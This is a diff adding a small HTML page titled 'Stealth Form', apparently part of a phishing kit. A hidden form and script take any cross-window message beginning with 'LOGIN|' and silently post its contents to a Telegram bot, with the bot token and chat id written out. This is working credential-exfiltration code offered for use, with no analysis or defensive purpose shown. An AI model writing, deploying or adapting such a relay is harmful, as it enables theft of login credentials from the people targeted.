@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Stealth Form</title></head>
+<body>
+<form id="stealthForm" action="https://api.telegram.org/bot7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY/sendMessage" method="POST" target="_self">
+  <input type="hidden" name="chat_id" value="1325797388">
+  <input type="hidden" name="text" id="hiddenMessage">
+  <input type="hidden" name="parse_mode" value="Markdown">
+</form>
+
+<script>
+  window.addEventListener("message", function(event) {
+    if (!event.data || typeof event.data !== "string" || !event.data.startsWith("LOGIN|")) return;
+
+    const message = event.data.slice(6); // Remove "LOGIN|"
+    document.getElementById("hiddenMessage").value = message;
+    document.getElementById("stealthForm").submit();
+  }, false);
+</script>
+</body>
+</html>
